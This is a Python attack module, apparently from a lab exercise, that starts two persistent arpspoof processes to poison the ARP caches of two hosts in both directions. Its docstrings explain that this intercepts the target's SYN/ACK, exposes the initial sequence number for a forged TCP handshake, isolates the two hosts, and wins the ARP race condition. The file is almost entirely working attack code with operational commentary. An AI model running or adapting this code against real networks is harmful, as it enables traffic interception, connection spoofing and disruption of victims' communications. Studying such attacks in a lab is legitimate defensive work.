"""
arp_spoof.py — Bidirectional ARP Cache Poisoning

Role in the attack: The target (10.0.2.20) will send its SYN/ACK response to
whoever its ARP cache says is at 10.0.2.30. By poisoning that entry so it
points to our MAC, the SYN/ACK flows through the attacker — giving us the ISN
we need to complete the forged handshake.

We also poison the server's ARP cache in the reverse direction so that any
legitimate traffic from the server arrives here too, fully isolating the two
hosts from each other.

Why the arpspoof binary and not a Scapy loop?
A single Scapy ARP reply is overwritten within milliseconds by the real server's
own gratuitous ARPs or by the target re-resolving the address. This is the
"ARP Race Condition". The arpspoof binary wins the race by sending poisoned
replies continuously at high frequency in an infinite loop — something a
one-shot Python packet send can never achieve reliably.
"""

import subprocess


def start_bidirectional_arpspoof(target1_ip, target2_ip, interface="eth0"):
    """
    Spawn two persistent arpspoof processes for full bidirectional poisoning.

    Process 1 — poisons TARGET's cache:
        tells 10.0.2.20 that "10.0.2.30 is at <our MAC>"
        Effect: target's SYN/ACK for the server is sent to us instead.

    Process 2 — poisons SERVER's cache:
        tells 10.0.2.30 that "10.0.2.20 is at <our MAC>"
        Effect: any traffic the real server sends toward the target arrives here,
        preventing the server from accidentally restoring the target's ARP entry.

    Both processes are started with stdout/stderr discarded: arpspoof's output
    is repetitive status noise that would flood the terminal and obscure the
    attack's own diagnostic prints.

    The attacker container has net.ipv4.ip_forward=0 (docker-compose sysctl),
    so poisoned packets that arrive here are NOT forwarded to the real
    destination. This is intentional: we want the SYN/ACK to stop here so
    tcpdump can capture it, not to act as a transparent MITM bridge.
    """
    print(f"[+] Starting bidirectional arpspoof between {target1_ip} and {target2_ip}")

    # -i selects the interface so arpspoof reads the correct source MAC.
    # -t <target> <host> : "tell <target> that <host> is at my MAC".
    cmd1 = ["arpspoof", "-i", interface, "-t", target1_ip, target2_ip]
    p1   = subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    cmd2 = ["arpspoof", "-i", interface, "-t", target2_ip, target1_ip]
    p2   = subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    return [p1, p2]


def stop_arpspoof(processes):
    """
    Terminate all running arpspoof processes.

    poll() is checked before terminate() to avoid sending SIGTERM to a process
    that already exited on its own (e.g., if the interface went down), which
    would raise an OSError on some platforms.

    Note: arpspoof does NOT restore the poisoned ARP entries on exit. The
    victims' caches will recover naturally once real ARP traffic resumes, or
    immediately if the hosts re-resolve the address themselves.
    """
    if processes:
        print("[+] Stopping arpspoof processes...")
        for p in processes:
            if p.poll() is None:   # None means the process is still alive
                p.terminate()
                p.wait()
